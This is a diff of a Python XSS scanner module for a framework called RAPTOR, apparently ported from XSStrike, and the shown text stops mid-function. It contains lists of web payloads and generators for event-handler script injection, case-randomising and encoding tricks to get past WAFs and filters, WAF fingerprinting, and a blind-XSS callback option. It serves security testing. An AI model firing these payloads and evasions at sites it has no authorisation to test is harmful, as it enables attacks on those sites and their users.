@@ -1,16 +1,30 @@
 #!/usr/bin/env python3
 """
-RAPTOR XSS Testing Module v2.0
+RAPTOR XSS Testing Module v3.0
 ================================
-Cross-Site Scripting detection for RAPTOR Framework.
-Integrated with core components: StealthManager, DatabaseManager, ReportManager.
+Cross-Site Scripting detection — XSStrike-grade intelligence inside RAPTOR.
+
+Usage (CLI):
+    python3 raptor.py -t example.com --modules xss
+
+Integrates:
+  - XSStrike-style context-aware reflection analysis
+  - Filter/WAF probing per character & tag
+  - Smart payload generation ranked by confidence
+  - DOM source/sink scanning
+  - Crawl-based form discovery
+  - Bruteforce from wordlist  (wordlists/payloads/xss.txt)
+  - Blind XSS with canary
+  - Header injection
+  - Full async, zero extra deps — uses BaseModule._make_request
 """
 
 import re
-import html
-import random
+import copy
 import asyncio
 import hashlib
+import os
+import sys
 from typing import List, Dict, Optional, Set, Tuple
 from dataclasses import dataclass, field
 from urllib.parse import urljoin, parse_qs, urlparse, quote, unquote
@@ -18,561 +32,964 @@ from urllib.parse import urljoin, parse_qs, urlparse, quote, unquote
 from core.base_module import BaseModule, Finding
 
 
+# ══════════════════════════════════════════════════════════════════════════════
+#  Constants — ported from XSStrike core/config.py
+# ══════════════════════════════════════════════════════════════════════════════
+
+XSSCHECKER  = 'st4r7s'          # probe token (non-destructive)
+MIN_EFFICIENCY = 90             # minimum fuzz match to report
+
+# Characters / strings probed against filter
+FILTER_PROBES = ['<', '>', '"', "'", ';', '(', ')', '{', '}',
+                 'alert', 'script', 'onerror', 'onload', '-->', '</scRipT/>']
+
+# Event handlers for payload generation
+EVENT_HANDLERS = [
+    'onload', 'onerror', 'onmouseover', 'onfocus', 'onclick',
+    'onmouseenter', 'onpointerover', 'ontoggle', 'onanimationstart',
+]
+
+# HTML tags that can carry events
+INJECTABLE_TAGS = [
+    'img', 'svg', 'body', 'input', 'details', 'video',
+    'audio', 'iframe', 'math', 'select', 'marquee',
+]
+
+# JS execution functions
+JS_FUNCTIONS = ['alert(1)', 'confirm(1)', 'prompt(1)', 'console.log(1)']
+
+# Fillings between tag name and event handler
+FILLINGS = [' ', '\t', '\n', '/', '%09', '&#9;', '&#10;']
+
+# WAF payload that should always trigger a block if WAF present
+WAF_NOISE = '<script>alert("XSS")</script>'
+
+# DOM sources regex
+DOM_SOURCES = (
+    r'\b(?:document\.(?:URL|documentURI|URLUnencoded|baseURI|cookie|referrer)'
+    r'|location\.(?:href|search|hash|pathname)'
+    r'|window\.name'
+    r'|history\.(?:pushState|replaceState)'
+    r'|(?:local|session)Storage)\b'
+)
+
+# DOM sinks regex
+DOM_SINKS = (
+    r'\b(?:eval|execCommand|assign|navigate|Function'
+    r'|set(?:Timeout|Interval|Immediate)|execScript'
+    r'|document\.(?:write|writeln)'
+    r'|\.innerHTML|\.outerHTML'
+    r'|\.insertAdjacentHTML'
+    r'|(?:document|window)\.location)\b'
+)
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  Payload dataclass
+# ══════════════════════════════════════════════════════════════════════════════
+
 @dataclass
 class XSSPayload:
-    """XSS payload with evasion metadata"""
-    payload: str
-    context: str  # html, attribute, script, url, style, js-template, json, xml, dom
-    encoding_chain: List[str] = field(default_factory=list)
+    payload:    str
+    context:    str          # html | attribute | script | url | style | dom | js_template
+    confidence: int   = 5   # 1–11 (XSStrike scale)
     waf_bypass: List[str] = field(default_factory=list)
-    severity: str = 'High'
+    severity:   str   = 'High'
     requires_interaction: bool = False
-    browser_specific: Optional[str] = None
 
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  Helpers
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _load_payload_file() -> List[str]:
+    """Load payloads from wordlists/payloads/xss.txt relative to project root."""
+    search_paths = [
+        os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'wordlists', 'payloads', 'xss.txt'),
+        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wordlists', 'payloads', 'xss.txt'),
+        'wordlists/payloads/xss.txt',
+    ]
+    for p in search_paths:
+        try:
+            with open(p, 'r', encoding='utf-8', errors='ignore') as f:
+                lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
+            if lines:
+                return lines
+        except FileNotFoundError:
+            continue
+    # Built-in fallback — covers all contexts without external file
+    return [
+        '<script>alert(1)</script>',
+        '<img src=x onerror=alert(1)>',
+        '<svg onload=alert(1)>',
+        '"><img src=x onerror=alert(1)>',
+        "'><img src=x onerror=alert(1)>",
+        '<body onload=alert(1)>',
+        '<iframe src=javascript:alert(1)>',
+        '"><svg onload=alert(1)>',
+        'javascript:alert(1)',
+        '";alert(1);//',
+        "';alert(1);//",
+        '${alert(1)}',
+        '<details ontoggle=alert(1) open>',
+        '<input onfocus=alert(1) autofocus>',
+        '<!--><img src=x onerror=alert(1)>',
+        '<scr\x00ipt>alert(1)</scr\x00ipt>',
+        '<img src=x onerror=\u0061lert(1)>',
+        '<svg/onload=alert(1)>',
+        '&lt;script&gt;alert(1)&lt;/script&gt;',
+        '<object data="data:text/html,<script>alert(1)</script>">',
+    ]
+
+
+def _random_upper(s: str) -> str:
+    """Randomly uppercase chars — evades case-sensitive filters."""
+    import random
+    return ''.join(c.upper() if random.random() > 0.5 else c for c in s)
+
+
+def _gen_html_payloads(allowed: Set[str]) -> List[str]:
+    """Generate context-aware payloads for HTML context."""
+    vectors = []
+    can_open  = '<' in allowed
+    can_close = '>' in allowed
+    if not (can_open and can_close):
+        return vectors
+    for tag in INJECTABLE_TAGS:
+        for ev in EVENT_HANDLERS:
+            for fill in FILLINGS[:3]:
+                for fn in JS_FUNCTIONS:
+                    vectors.append(f'<{tag}{fill}{ev}={fn}>')
+                    vectors.append(f'<{_random_upper(tag)}{fill}{_random_upper(ev)}={fn}>')
+    # script break-out
+    vectors.append('</script><script>alert(1)</script>')
+    vectors.append('<script>alert(1)</script>')
+    return vectors
+
+
+def _gen_attribute_payloads(quote_char: str, allowed: Set[str]) -> List[str]:
+    """Generate payloads for attribute context."""
+    vectors = []
+    q = quote_char or '"'
+    if q in allowed:
+        for fn in JS_FUNCTIONS:
+            for ev in EVENT_HANDLERS[:4]:
+                vectors.append(f'{q} {ev}={fn} {q}')
+                vectors.append(f'{q} autofocus {ev}={fn} {q}')
+        if '>' in allowed:
+            vectors.append(f'{q}><img src=x onerror=alert(1)>')
+    # escape attempt
+    vectors.append(f'\\{q} autofocus onfocus=alert(1) \\{q}')
+    vectors.append('javascript:alert(1)')
+    return vectors
+
+
+def _gen_script_payloads(quote_char: str) -> List[str]:
+    """Generate payloads for script context."""
+    q = quote_char or '"'
+    vectors = []
+    closers = [q + ';', q + '+', q + ')', ')']
+    for closer in closers:
+        for fn in JS_FUNCTIONS:
+            vectors.append(f'{closer}alert(1)//')
+            vectors.append(f'{closer}{fn}//')
+    vectors.append('</script><script>alert(1)</script>')
+    vectors.append('${alert(1)}')
+    return vectors
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  DOM analyser — ported from XSStrike dom.py (no color deps)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _dom_scan(response_text: str) -> List[Dict]:
+    """
+    Scan inline <script> blocks for dangerous source→sink flows.
+    Returns list of {line_num, line, source, sink} dicts.
+    """
+    results = []
+    scripts = re.findall(r'(?is)<script[^>]*>(.*?)</script>', response_text)
+    for script in scripts:
+        lines = script.split('\n')
+        all_controlled: Set[str] = set()
+        for num, raw_line in enumerate(lines, 1):
+            line = raw_line
+            controlled: Set[str] = set()
+
+            # track variables that receive tainted sources
+            parts = line.split('var ')
+            if len(parts) > 1:
+                for part in parts[1:]:
+                    for cv in all_controlled:
+                        if cv.replace('\\$', '$') in part:
+                            m = re.search(r'[a-zA-Z$_][a-zA-Z0-9$_]*', part)
+                            if m:
+                                controlled.add(m.group().replace('$', '\\$'))
+
+            source_found = False
+            for m in re.finditer(DOM_SOURCES, line):
+                source_found = True
+                source = m.group()
+                # if the source is assigned to a var, track it
+                for part in parts[1:]:
+                    if source in part:
+                        mv = re.search(r'[a-zA-Z$_][a-zA-Z0-9$_]*', part)
+                        if mv:
+                            controlled.add(mv.group().replace('$', '\\$'))
+                results.append({'line': num, 'type': 'source', 'text': raw_line.strip(), 'match': source})
+
+            all_controlled.update(controlled)
+
+            # propagation — controlled variable used in this line
+            for cv in all_controlled:
+                if re.search(r'\b%s\b' % cv, line):
+                    source_found = True
+
+            # sinks
+            for m in re.finditer(DOM_SINKS, line):
+                results.append({'line': num, 'type': 'sink', 'text': raw_line.strip(), 'match': m.group()})
+
+    return results
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  HTML Parser — extracts reflection context (XSStrike htmlParser logic)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _html_parser(body: str, probe: str) -> Dict[int, Dict]:
+    """
+    Find all reflections of probe in body and characterise each context.
+    Returns {position_index: {context, details}} matching XSStrike format.
+    """
+    body_lower = body.lower()
+    probe_lower = probe.lower()
+    occurences: Dict[int, Dict] = {}
+    idx = 0
+
+    start = 0
+    while True:
+        pos = body_lower.find(probe_lower, start)
+        if pos == -1:
+            break
+
+        window_before = body[:pos]
+        window_after  = body[pos + len(probe):]
+
+        context  = 'html'
+        details: Dict = {}
+
+        # ── Script context ───────────────────────────────────────────────────
+        open_script  = window_before.lower().rfind('<script')
+        close_script = window_before.lower().rfind('</script')
+        if open_script > close_script:
+            context = 'script'
+            # determine quote character around reflection
+            script_inner = body[open_script:pos]
+            quote_char = ''
+            for ch in reversed(script_inner):
+                if ch in ('"', "'", '`'):
+                    quote_char = ch
+                    break
+            details['quote'] = quote_char
+        else:
+            # ── Attribute context ────────────────────────────────────────────
+            last_open_tag = window_before.rfind('<')
+            if last_open_tag != -1:
+                tag_str = window_before[last_open_tag:]
+                attr_match = re.search(
+                    r'(\w[\w-]*)=["\']?[^"\']*$', tag_str
+                )
+                if attr_match and re.search(r'<[^>]*$', tag_str):
+                    context = 'attribute'
+                    details['name'] = attr_match.group(1)
+                    quote_char = ''
+                    after_eq = tag_str[attr_match.end(0) - len(attr_match.group(0).split('=')[1]):]
+                    if after_eq and after_eq[0] in ('"', "'"):
+                        quote_char = after_eq[0]
+                    details['quote'] = quote_char
+                    details['type']  = 'value'
+                    # tag name
+                    tag_name_m = re.match(r'<\s*(\w+)', tag_str)
+                    details['tag'] = tag_name_m.group(1).lower() if tag_name_m else ''
+
+            # ── Comment context ──────────────────────────────────────────────
+            if context == 'html':
+                if '<!--' in window_before and '-->' not in window_before[window_before.rfind('<!--'):]:
+                    context = 'comment'
+
+        occurences[idx] = {'context': context, 'details': details, 'position': pos}
+        idx  += 1
+        start = pos + 1
+
+    return occurences
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  XSSTester
+# ══════════════════════════════════════════════════════════════════════════════
 
 class XSSTester(BaseModule):
     """
-    Advanced XSS detection module for RAPTOR Framework.
-    
-    Usage:
-        async with XSSTester(config, stealth_manager, db_manager) as module:
-            findings = await module.run(target_url, scope='comprehensive')
+    Advanced XSS detection module — XSStrike intelligence, RAPTOR integration.
+
+    Invoked by raptor.py:
+        async with XSSTester(config, stealth, db, graph) as m:
+            findings = await m.run(target, **kwargs)
     """
-    
+
+    # ── Init ─────────────────────────────────────────────────────────────────
+
     def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
-        super().__init__(config, stealth, db)
-        self.graph = graph_manager
-        self.findings: List[Finding] = []
-        self.tested_params: Set[str] = set()
-        self.reflection_cache: Dict[str, Dict] = {}
-        self.waf_detected: bool = False
-        
-        # Load configuration
+        super().__init__(config, stealth, db, graph_manager)
+        self.findings:       List[Finding] = []
+        self.tested_params:  Set[str]      = set()
+        self.checked_forms:  Dict[str, List[str]] = {}
+        self.waf_name:       Optional[str] = None
+
+        # tunables from config / raptor kwargs
         self.evasion_level = config.get('evasion_level', 3)
-        self.time_delay = config.get('blind_timeout', 10)
-        self.max_depth = config.get('max_depth', 3)
-        self.rate_limit = config.get('rate_limit', 10)
-        
-        # Initialize payload database
-        self.payloads = self._initialize_payloads()
-        self.error_signatures = self._load_error_signatures()
-        
-    def _initialize_payloads(self) -> Dict[str, List[XSSPayload]]:
-        """Initialize comprehensive XSS payload database"""
-        
-        payloads = {
-            'html': [
-                XSSPayload('<script>alert(1)</script>', 'html', severity='High'),
-                XSSPayload('<img src=x onerror=alert(1)>', 'html', severity='High'),
-                XSSPayload('<svg onload=alert(1)>', 'html', severity='High'),
-                XSSPayload('<body onload=alert(1)>', 'html', severity='High'),
-                XSSPayload('<iframe src=javascript:alert(1)>', 'html', severity='High'),
-                XSSPayload('<input onfocus=alert(1) autofocus>', 'html', severity='High', requires_interaction=True),
-                XSSPayload('<details ontoggle=alert(1) open>', 'html', severity='Medium', requires_interaction=True),
-                XSSPayload('<marquee onstart=alert(1)>', 'html', severity='Medium'),
-                XSSPayload('<video><source onerror=alert(1)>', 'html', severity='High'),
-                XSSPayload('<audio src=x onerror=alert(1)>', 'html', severity='High'),
-                # WAF bypass variants
-                XSSPayload('<img src=x onerror=\\u0061lert(1)>', 'html', 
-                          encoding_chain=['unicode_escape'], waf_bypass=['unicode'], severity='High'),
-                XSSPayload('<svg onload=\\u0061lert(1)>', 'html',
-                          encoding_chain=['unicode_escape'], waf_bypass=['unicode'], severity='High'),
-                XSSPayload('<iframe srcdoc="<script>alert(1)</script>">', 'html',
-                          waf_bypass=['iframe_srcdoc'], severity='High'),
-                XSSPayload('<object data="data:text/html,<script>alert(1)</script>">', 'html',
-                          waf_bypass=['object_data'], severity='High'),
-            ],
-            'attribute': [
-                XSSPayload('" onfocus=alert(1) autofocus="', 'attribute', severity='High', requires_interaction=True),
-                XSSPayload("' onmouseover='alert(1)'", 'attribute', severity='Medium', requires_interaction=True),
-                XSSPayload('" onload="alert(1)"', 'attribute', severity='High'),
-                XSSPayload('" onerror="alert(1)"', 'attribute', severity='High'),
-                XSSPayload('javascript:alert(1)', 'attribute', severity='Medium'),
-                XSSPayload('data:text/html,<script>alert(1)</script>', 'attribute', severity='High'),
-                # Bypass variants
-                XSSPayload('" onfocus=&#97;lert(1) autofocus="', 'attribute',
-                          encoding_chain=['html_entities'], waf_bypass=['html_encoding'], severity='High'),
-            ],
-            'script': [
-                XSSPayload('";alert(1);//', 'script', severity='Critical'),
-                XSSPayload("';alert(1);//", 'script', severity='Critical'),
-                XSSPayload("\\';alert(1);//", 'script', severity='Critical'),
-                XSSPayload('${alert(1)}', 'script', severity='Critical'),
-                XSSPayload('`alert(1)`', 'script', severity='Critical'),
-                XSSPayload('"+alert(1)+"', 'script', severity='Critical'),
-                XSSPayload("'+alert(1)+'", 'script', severity='Critical'),
-                XSSPayload('</script><script>alert(1)</script>', 'script', severity='Critical'),
-                XSSPayload('\\x3cscript\\x3ealert(1)\\x3c/script\\x3e', 'script',
-                          encoding_chain=['hex_escape'], waf_bypass=['hex_encoding'], severity='Critical'),
-            ],
-            'js_template': [
-                XSSPayload('${alert(1)}', 'js_template', severity='Critical'),
-                XSSPayload('{{constructor.constructor("alert(1)")()}}', 'js_template', severity='Critical'),
-                XSSPayload('<%=alert(1)%>', 'js_template', severity='Critical'),
-                XSSPayload('${constructor.constructor("alert(1)")()}', 'js_template', severity='Critical'),
-            ],
-            'url': [
-                XSSPayload('javascript:alert(1)', 'url', severity='High'),
-                XSSPayload('javascript://%0aalert(1)', 'url', waf_bypass=['newline_bypass'], severity='High'),
-                XSSPayload('javascript://%0d%0aalert(1)', 'url', waf_bypass=['newline_bypass'], severity='High'),
-                XSSPayload('data:text/html,<script>alert(1)</script>', 'url', severity='High'),
-                XSSPayload('vbscript:msgbox(1)', 'url', severity='Medium', browser_specific='ie'),
-            ],
-            'style': [
-                XSSPayload('expression(alert(1))', 'style', severity='High', browser_specific='ie'),
-                XSSPayload('-moz-binding(url("//xss.ht"))', 'style', severity='Medium', browser_specific='firefox'),
-                XSSPayload('</style><script>alert(1)</script>', 'style', severity='High'),
-            ],
-            'dom': [
-                XSSPayload('#<img src=x onerror=alert(1)>', 'dom', severity='High'),
-                XSSPayload('#javascript:alert(1)', 'dom', severity='High'),
-                XSSPayload('?search=<img src=x onerror=alert(1)>', 'dom', severity='High'),
-            ],
-            'json': [
-                XSSPayload('{"__proto__":{"isAdmin":true}}', 'json', severity='High', waf_bypass=['prototype_pollution']),
-            ]
-        }
-        
-        return payloads
-    
-    def _load_error_signatures(self) -> Dict[str, List[str]]:
-        """Load error signatures for context detection"""
-        return {
-            'html': [r'<[^>]*$', r'^[^<]*>'],
-            'attribute': [r'\w+=["\'][^"\']*$', r'^[^"\']*["\']'],
-            'script': [r'<script[^>]*>.*$', r'</script>'],
-            'style': [r'<style[^>]*>.*$', r'</style>'],
-            'url': [r'(href|src|action)=["\'][^"\']*$', r'^[^"\']*["\']'],
-        }
-    
+        self.delay         = config.get('delay',         0)
+        self.timeout       = config.get('request_timeout', 30)
+        self.max_params    = config.get('max_params',    20)
+        self.blind_cb      = config.get('blind_callback', '')
+
+        # payload wordlist
+        self.wordlist: List[str] = _load_payload_file()
+
+    # ── Context managers ─────────────────────────────────────────────────────
+
     async def __aenter__(self):
-        """Async context manager entry"""
-        self.logger.info("🔥 Initializing XSS Testing Module")
+        self.logger.info('🔥 XSS Module v3.0 initialising (XSStrike engine)')
         return self
-    
-    async def __aexit__(self, exc_type, exc_val, exc_tb):
-        """Async context manager exit"""
-        if self.findings and self.db:
-            await self._store_findings()
+
+    async def __aexit__(self, *_):
         return False
-    
+
+    # ══════════════════════════════════════════════════════════════════════════
+    #  Public entry point
+    # ══════════════════════════════════════════════════════════════════════════
+
     async def run(self, target: str, **kwargs) -> List[Finding]:
-        """
-        Execute XSS testing against target.
-        
-        Args:
-            target: Target URL
-            scope: 'quick', 'standard', 'comprehensive', 'aggressive'
-            
-        Returns:
-            List of Finding objects
-        """
         scope = kwargs.get('scope', 'standard')
-        self.logger.info(f"🚀 Starting XSS scan against {target} [Scope: {scope}]")
-        
-        # Phase 1: Parameter Discovery
-        self.logger.info("🔍 Phase 1: Discovering injection points")
-        params = await self._discover_parameters(target)
-        
-        # Phase 2: WAF Detection
-        self.logger.info("🛡️ Phase 2: Detecting WAF/IPS")
+        self.logger.info(f'🚀 XSS scan → {target}  [scope: {scope}]')
+
+        # ── Phase 1: WAF detection ────────────────────────────────────────────
+        self.logger.info('🛡️  Phase 1: WAF detection')
         await self._detect_waf(target)
-        
-        # Phase 3: Reflected XSS Testing
-        self.logger.info("🎯 Phase 3: Testing Reflected XSS")
-        await self._test_reflected_xss(target, params, scope)
-        
-        # Phase 4: DOM-based XSS (if not quick scope)
-        if scope in ['standard', 'comprehensive', 'aggressive']:
-            self.logger.info("🌳 Phase 4: Testing DOM-based XSS")
-            await self._test_dom_xss(target, params)
-        
-        # Phase 5: Blind XSS (comprehensive+)
-        if scope in ['comprehensive', 'aggressive']:
-            self.logger.info("👁️ Phase 5: Testing Blind XSS")
-            await self._test_blind_xss(target, params)
-        
-        # Phase 6: Header-based XSS (aggressive)
+
+        # ── Phase 2: DOM analysis ─────────────────────────────────────────────
+        self.logger.info('🌳 Phase 2: DOM source/sink analysis')
+        await self._run_dom_scan(target)
+
+        # ── Phase 3: Reflected XSS on URL parameters ──────────────────────────
+        self.logger.info('🔍 Phase 3: URL parameter discovery + Reflected XSS')
+        url_params = await self._discover_url_params(target)
+        await self._test_reflected_xss(target, url_params)
+
+        # ── Phase 4: Form-based XSS (crawl) ───────────────────────────────────
+        if scope in ('standard', 'comprehensive', 'aggressive'):
+            self.logger.info('📋 Phase 4: Form crawl + XSS')
+            await self._crawl_forms(target)
+
+        # ── Phase 5: Wordlist bruteforce ──────────────────────────────────────
+        if scope in ('comprehensive', 'aggressive'):
+            self.logger.info('💥 Phase 5: Wordlist bruteforce')
+            await self._bruteforce(target, url_params)
+
+        # ── Phase 6: Blind XSS ────────────────────────────────────────────────
+        if scope in ('comprehensive', 'aggressive'):
+            self.logger.info('👁️  Phase 6: Blind XSS')
+            await self._test_blind_xss(target, url_params)
+
+        # ── Phase 7: Header injection (aggressive) ────────────────────────────
         if scope == 'aggressive':
-            self.logger.info("📋 Phase 6: Testing Header-based XSS")
+            self.logger.info('📡 Phase 7: Header XSS')
             await self._test_header_xss(target)
-        
-        self.logger.info(f"✅ XSS module complete. Findings: {len(self.findings)}")
+
+        self.logger.info(f'✅ XSS complete — {len(self.findings)} finding(s)')
         return self.findings
-    
-    async def _discover_parameters(self, target: str) -> Dict[str, List[str]]:
-        """Discover URL parameters and forms"""
-        discovered = {
-            'url_params': set(),
-            'forms': [],
-            'json_endpoints': []
+
+    # ══════════════════════════════════════════════════════════════════════════
+    #  Phase 1 — WAF Detection  (XSStrike wafDetector logic)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    async def _detect_waf(self, target: str):
+        """Send a noisy payload and score against WAF signatures."""
+        test_url = f'{target}?xss={quote(WAF_NOISE)}'
+        resp = await self._make_request(test_url)
+        if not resp:
+            return
+
+        page    = await resp.text()
+        code    = str(resp.status)
+        headers = str(resp.headers)
+
+        # Basic scoring without external wafSignatures.json
+        waf_indicators = {
+            'Cloudflare':  [r'cloudflare', r'cf-ray'],
+            'AWS WAF':     [r'aws.*waf', r'awselb'],
+            'ModSecurity': [r'mod_security', r'modsecurity'],
+            'Akamai':      [r'akamai', r'ak-hmac'],
+            'Sucuri':      [r'sucuri', r'x-sucuri-id'],
+            'Generic WAF': [r'blocked', r'forbidden', r'firewall', r'waf'],
         }
-        
-        # Common parameters organized by likelihood
-        common_params = [
-            'id', 'page', 'search', 'query', 'q', 's', 'term',
-            'name', 'email', 'username', 'password', 'token',
-            'url', 'redirect', 'next', 'return', 'callback',
-            'message', 'comment', 'title', 'description', 'content',
-            'category', 'tag', 'filter', 'sort', 'order',
-            'jsonp', 'callback', 'cb', 'function'
+
+        if int(code) >= 400:
+            for waf_name, patterns in waf_indicators.items():
+                combined = (page + headers).lower()
+                if any(re.search(p, combined, re.I) for p in patterns):
+                    self.waf_name = waf_name
+                    self.logger.warning(f'   ⚠️  WAF detected: {waf_name} — enabling evasion')
+                    return
+            # blocked but unrecognised
+            self.waf_name = 'Unknown WAF'
+            self.logger.warning('   ⚠️  WAF/IPS detected (unrecognised) — enabling evasion')
+
+    # ══════════════════════════════════════════════════════════════════════════
+    #  Phase 2 — DOM Scan
+    # ══════════════════════════════════════════════════════════════════════════
+
+    async def _run_dom_scan(self, target: str):
+        resp = await self._make_request(target)
+        if not resp:
+            return
+        body = await resp.text()
+        hits = _dom_scan(body)
+        if not hits:
+            return
+
+        sources = [h for h in hits if h['type'] == 'source']
+        sinks   = [h for h in hits if h['type'] == 'sink']
+
+        if sources and sinks:
+            severity = 'High'
+            desc     = 'DOM-based XSS: tainted sources flow into dangerous sinks.'
+        elif sinks:
+            severity = 'Medium'
+            desc     = 'Dangerous DOM sinks found — manual review recommended.'
+        else:
+            severity = 'Low'
+            desc     = 'DOM taint sources found — may reach sinks via application logic.'
+
+        evidence_lines = '\n'.join(
+            f"  Line {h['line']} [{h['type'].upper()}] {h['match']}: {h['text'][:120]}"
+            for h in hits[:20]
+        )
+
+        finding = Finding(
+            module      = 'xss',
+            title       = f'[DOM] Potential DOM XSS — {len(sources)} source(s), {len(sinks)} sink(s)',
+            severity    = severity,
+            description = (
+                f'## DOM-Based XSS Analysis\n\n{desc}\n\n'
+                f'### Evidence\n```\n{evidence_lines}\n```\n\n'
+                '### Impact\nUser-controlled data may reach dangerous DOM APIs '
+                'allowing arbitrary JS execution without server interaction.\n\n'
+                '### Remediation\nAvoid inserting user data into innerHTML, eval, '
+                'document.write, or location. Use textContent and DOMParser instead.'
+            ),
+            evidence    = {'sources': len(sources), 'sinks': len(sinks), 'hits': hits[:20]},
+            poc         = f'Review page source at: {target}',
+            remediation = 'Replace dangerous sinks with safe DOM APIs; sanitise tainted sources.',
+            cvss_score  = 7.1 if (sources and sinks) else 4.3,
+            bounty_score= 2500 if (sources and sinks) else 500,
+            target      = target,
+        )
+        self.findings.append(finding)
+        self.add_finding(finding)
+
+    # ══════════════════════════════════════════════════════════════════════════
+    #  Phase 3 — Reflected XSS  (XSStrike scan.py logic)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    async def _discover_url_params(self, target: str) -> List[str]:
+        """Extract real params from page links; fall back to common list."""
+        common = [
+            'q', 'search', 'query', 's', 'id', 'page', 'name', 'url',
+            'redirect', 'next', 'return', 'callback', 'message', 'comment',
+            'title', 'description', 'content', 'filter', 'sort', 'term',
+            'email', 'username', 'token', 'ref', 'from', 'to', 'lang',
         ]
-        
+        parsed = urlparse(target)
+        if parsed.query:
+            return list(parse_qs(parsed.query).keys())
+
+        discovered: Set[str] = set()
         try:
             resp = await self._make_request(target)
-            if not resp:
-                return {'url_params': common_params, 'forms': [], 'json_endpoints': []}
-            
-            body = await resp.text()
-            
-            # Extract forms
-            forms = re.findall(
-                r'<form[^>]*?(?:action=["\']([^"\']*)["\'])?[^>]*>(.*?)</form>',
-                body, re.DOTALL | re.I
-            )
-            discovered['forms'] = forms
-            
-            # Extract URL parameters from links
-            links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', body)
-            for link in links:
-                if '?' in link:
-                    parsed = urlparse(link)
-                    params = parse_qs(parsed.query)
-                    discovered['url_params'].update(params.keys())
-            
-            # Detect JSON endpoints
-            if 'application/json' in resp.headers.get('Content-Type', ''):
-                discovered['json_endpoints'].append(target)
-            
-            # Check for API endpoints
-            api_patterns = re.findall(r'["\'](/api/[^"\']+)["\']', body)
-            discovered['json_endpoints'].extend(urljoin(target, p) for p in api_patterns)
-            
+            if resp:
+                body  = await resp.text()
+                links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', body, re.I)
+                for link in links:
+                    for k in parse_qs(urlparse(link).query).keys():
+                        discovered.add(k)
         except Exception as e:
-            self.logger.debug(f"Parameter discovery error: {e}")
-        
-        # Merge with common params
-        discovered['url_params'].update(common_params)
-        discovered['url_params'] = list(discovered['url_params'])
-        
-        return discovered
-    
-    async def _detect_waf(self, target: str):
-        """Detect Web Application Firewall"""
-        test_payloads = [
-            '<script>alert(1)</script>',
-            'javascript:alert(1)',
-            "' OR '1'='1",
-        ]
-        
-        blocked = 0
-        for payload in test_payloads:
-            try:
-                test_url = f"{target}?test={quote(payload)}"
-                resp = await self._make_request(test_url)
-                
-                if resp:
-                    if resp.status in [403, 406, 501]:
-                        blocked += 1
-                    body = await resp.text()
-                    if any(x in body.lower() for x in ['blocked', 'waf', 'firewall', 'security']):
-                        blocked += 1
-            except Exception:
-                blocked += 1
-        
-        self.waf_detected = blocked >= 2
-        if self.waf_detected:
-            self.logger.warning("   WAF/IPS detected - enabling evasion techniques")
-    
-    async def _test_reflected_xss(self, target: str, params: Dict, scope: str):
-        """Test for Reflected XSS vulnerabilities"""
-        url_params = params.get('url_params', [])[:10]  # cap at 10 params
+            self.logger.debug(f'Param discovery: {e}')
 
-        semaphore = asyncio.Semaphore(5)
+        if not discovered:
+            discovered.update(common)
+        return list(discovered)[:self.max_params]
 
-        async def test_param(param):
-            async with semaphore:
+    async def _test_reflected_xss(self, target: str, params: List[str]):
+        """XSStrike-style: probe → parse → filter-check → generate → verify."""
+        sem = asyncio.Semaphore(5)
+
+        async def test_one(param: str):
+            async with sem:
                 if param in self.tested_params:
                     return
-                probe = f"RAPTOR{hash(param) % 10000}"
-                context = await self._detect_context(target, param, probe)
-                if not context.get('reflected'):
-                    return
-                payloads = self._select_payloads(context['type'])
-                for payload_obj in payloads[:5]:  # max 5 payloads per param
-                    if await self._test_payload(target, param, payload_obj, context):
-                        self.tested_params.add(param)
-                        break
+                await self._xsstrike_scan_param(target, param)
 
-        await asyncio.gather(*[test_param(p) for p in url_params], return_exceptions=True)
-    
-    async def _detect_context(self, target: str, param: str, probe: str) -> Dict:
-        """Detect reflection context"""
-        test_url = f"{target}?{param}={probe}"
-        
-        try:
-            resp = await self._make_request(test_url)
+        await asyncio.gather(*[test_one(p) for p in params], return_exceptions=True)
+
+    async def _xsstrike_scan_param(self, target: str, param: str):
+        """
+        Full XSStrike pipeline for one parameter:
+          1. Send probe token
+          2. Parse reflections + context  (htmlParser)
+          3. Probe allowed chars          (filterChecker)
+          4. Generate ranked vectors      (generator)
+          5. Verify each vector           (checker)
+        """
+        probe = XSSCHECKER
+
+        # ── Step 1: probe reflection ──────────────────────────────────────────
+        test_url = self._build_url(target, param, probe)
+        resp = await self._make_request(test_url)
+        if not resp:
+            return
+        body = await resp.text()
+
+        if probe.lower() not in body.lower():
+            return  # param not reflected at all
+
+        # ── Step 2: parse reflection context ─────────────────────────────────
+        occurences = _html_parser(body, probe)
+        if not occurences:
+            return
+
+        self.logger.info(f'   ↳ {param}: {len(occurences)} reflection(s)')
+
+        # ── Step 3: filter check — which chars survive? ───────────────────────
+        allowed = await self._filter_check(target, param, occurences)
+
+        # ── Step 4: generate payloads ranked by confidence ────────────────────
+        vectors = self._generate_vectors(occurences, allowed)
+
+        # ── Step 5: verify each vector ────────────────────────────────────────
+        for confidence, payloads in sorted(vectors.items(), reverse=True):
+            for raw_payload in list(payloads)[:8]:
+                success = await self._verify_payload(
+                    target, param, raw_payload, occurences, confidence
+                )
+                if success:
+                    self.tested_params.add(param)
+                    return   # one confirmed finding per param is sufficient
+
+    async def _filter_check(self, target: str, param: str,
+                            occurences: Dict) -> Set[str]:
+        """
+        Probe each char/string in FILTER_PROBES and record which ones
+        are reflected unmodified (i.e. allowed through the filter).
+        """
+        allowed: Set[str] = set()
+        for probe_str in FILTER_PROBES:
+            check_str = XSSCHECKER + probe_str + 'end'
+            url = self._build_url(target, param, check_str)
+            resp = await self._make_request(url)
             if not resp:
-                return {'reflected': False, 'type': 'unknown'}
-            
+                continue
             body = await resp.text()
-            
